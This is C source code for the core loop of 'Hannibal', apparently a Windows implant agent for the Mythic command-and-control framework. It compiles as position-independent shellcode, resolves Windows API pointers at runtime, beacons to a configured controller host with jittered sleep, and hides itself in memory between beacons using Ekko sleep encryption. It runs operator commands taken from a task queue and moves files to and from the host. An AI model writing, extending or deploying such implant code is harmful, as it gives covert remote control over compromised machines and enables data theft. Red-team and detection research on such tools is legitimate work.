/**
 * This is the heart of the agent. It runs the primary loop.
 * Tasks Handled:
 * Sets configurations
 * Resolves function pointers
 * Initializes all queues
 * Generates Encryption Key for Sleep
 * Checks Agent In
 * Gets Tasks
 * Executes Tasks
 * Sends Task Responses
 */


#include "hannibal.h"
#include "hannibal_tasking.h"

#ifdef PROFILE_MYTHIC_HTTP
#include "profile_mythic_http.h"
#endif


/**
 * This section enables compiling as a PIC bin or an exe for debugging.
 * Use windows_makefile or linux_makefile for the .bin, debug_makefile for
 * the exe.
 */

////////////////////////////////////////////////// PIC BUILD

#ifdef PIC_BUILD

SECTION_CODE VOID Hannibal(
    _In_ PVOID Param
) {
    PINSTANCE hannibal_instance_ptr = (PINSTANCE)*(PVOID*)((PVOID)((UINT_PTR)StRipStart() +  (UINT_PTR)&__Instance_offset));

#else 

////////////////////////////////////////////////// DEBUG BUILD

// Global Variable Instance
INSTANCE hannibal_instance;
PINSTANCE hannibal_instance_ptr = &hannibal_instance;

int main(
    _In_ PVOID Param
) {
    
#endif
    
    hannibal_instance_ptr->config.sleep = CONFIG_SLEEP;
    hannibal_instance_ptr->config.jitter = CONFIG_SLEEP_JITTER;
    
    /////////////////////////// Set Communication Profile 

    hannibal_instance_ptr->config.checked_in = FALSE;

    hannibal_instance_ptr->config.controller_host = CONFIG_HOST;
    hannibal_instance_ptr->config.http_method = L"POST"; // TODO: Add more methods than just POST.
    hannibal_instance_ptr->config.user_agent = CONFIG_UA;
    hannibal_instance_ptr->config.controller_url = CONFIG_POST_URI;
    hannibal_instance_ptr->config.uuid = CONFIG_UUID;

    // Load needed DLLs and resolve functions into the instance.
    hannibal_resolve_pointers();

    hannibal_instance_ptr->config.process_heap = hannibal_instance_ptr->Win32.GetProcessHeap();

    // Create TASK queue structure on heap and track pointer. Doesn't get freed. 
    hannibal_instance_ptr->tasks.tasks_queue = (TASK_QUEUE *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(TASK_QUEUE));

    if(!init_task_queue(hannibal_instance_ptr->tasks.tasks_queue, TASK_CIRCULAR_QUEUE_SIZE)){
        return NULL;
    }

    // Create TASK queue structure on heap and track pointer. Doesn't get freed. 
    hannibal_instance_ptr->tasks.tasks_response_queue = (TASK_QUEUE *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(TASK_QUEUE));


    if(!init_task_response_queue(hannibal_instance_ptr->tasks.tasks_response_queue, TASK_CIRCULAR_QUEUE_SIZE)){
        return NULL;
    }

    // Initialize all cmd function pointers into hannibal instance
    init_task_ptrs();

    // For download tracking
    hannibal_instance_ptr->tasks.file_downloads = (FILE_DOWNLOAD *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(FILE_DOWNLOAD) * CONCURRENT_FILE_DOWNLOADS);
    
    for (int i = 0; i < CONCURRENT_FILE_DOWNLOADS; i++){
        hannibal_instance_ptr->tasks.file_downloads[i].download_uuid = NULL;
    }

     // For upload tracking
    hannibal_instance_ptr->tasks.file_uploads = (FILE_UPLOAD *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, sizeof(FILE_UPLOAD) * CONCURRENT_FILE_DOWNLOADS);
    
    for (int i = 0; i < CONCURRENT_FILE_UPLOADS; i++){
        hannibal_instance_ptr->tasks.file_uploads[i].upload_uuid = NULL;
    }


    // Set up Encryption

    hannibal_instance_ptr->config.encrypt_key = (UINT8 *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, ENCRYPT_KEY_SIZE);
    hannibal_instance_ptr->config.encrypt_key_size = ENCRYPT_KEY_SIZE;

    // Encrypts network messages. 
    char encrypt_key[] = CONFIG_ENCRYPT_KEY;
    pic_memcpy(hannibal_instance_ptr->config.encrypt_key, encrypt_key, ENCRYPT_KEY_SIZE);
    
    // Currently used by Ekko to encrypt the sleeping agent.
    ULONG seed = pic_rand_number_32();
    hannibal_instance_ptr->config.local_encryption_key = (UINT8 *)hannibal_instance_ptr->Win32.HeapAlloc(hannibal_instance_ptr->config.process_heap, HEAP_ZERO_MEMORY, LOCAL_ENCRYPT_KEY_SIZE);
    hannibal_instance_ptr->config.local_encryption_key_size = LOCAL_ENCRYPT_KEY_SIZE;

    for (int i = 0; i < LOCAL_ENCRYPT_KEY_SIZE; i++){
        hannibal_instance_ptr->config.local_encryption_key[i] = (CHAR)gen_random_byte(&seed);
    }

    // Checkin Loop.
    // Keep trying to checkin if fail.
    while(hannibal_instance_ptr->config.checked_in == FALSE){
        
        ULONG sleep = generate_sleep_with_jitter(hannibal_instance_ptr->config.sleep, hannibal_instance_ptr->config.jitter); 

#ifdef PROFILE_MYTHIC_HTTP
        mythic_http_checkin();
#endif
        // TODO: Add ifdef sleep switcher
        utility_sleep_ekko(sleep, SLEEPOBF_EKKO);
        // hannibal_instance_ptr->Win32.Sleep(3000);
    }

    // Primary loop. 
    while(1){

        ULONG sleep = generate_sleep_with_jitter(hannibal_instance_ptr->config.sleep, hannibal_instance_ptr->config.jitter); 

#ifdef PROFILE_MYTHIC_HTTP
        mythic_http_get_tasks();
#endif
        utility_sleep_ekko(sleep, SLEEPOBF_EKKO);
        hannibal_exec_tasks();

#ifdef PROFILE_MYTHIC_HTTP
        mythic_http_post_tasks();
#endif
    }
}

/**
 * Execute all queued commands.
 */
SECTION_CODE void hannibal_exec_tasks()
{
    HANNIBAL_INSTANCE_PTR

    for (int i = hannibal_instance_ptr->tasks.tasks_queue->size; i > 0; i--){

        TASK exec_task;
        task_dequeue(hannibal_instance_ptr->tasks.tasks_queue, &exec_task);

        for(int j = 0; j < hannibal_instance_ptr->tasks.task_func_ptrs_size; j++){
            if(hannibal_instance_ptr->tasks.task_func_ptrs[j].cmd_id == exec_task.cmd_id){
                hannibal_instance_ptr->tasks.task_func_ptrs[j].cmd_ptr(exec_task);
                break;
            }
        }
    }
}


SECTION_CODE ULONG generate_sleep_with_jitter(ULONG sleep, ULONG jitter) 
{
    HANNIBAL_INSTANCE_PTR

    ULONG jitter_amount = (hannibal_instance_ptr->config.sleep * hannibal_instance_ptr->config.jitter) / 100; // jitter percentage of sleep
    ULONG min_sleep = hannibal_instance_ptr->config.sleep > jitter_amount ? hannibal_instance_ptr->config.sleep - jitter_amount : 0; // min
    ULONG max_sleep = hannibal_instance_ptr->config.sleep + jitter_amount; // max
    ULONG range = max_sleep - min_sleep + 1;
    ULONG random_offset = pic_rand_number_32() % range; 

    return (min_sleep + random_offset) * 1000; // Time in ms
}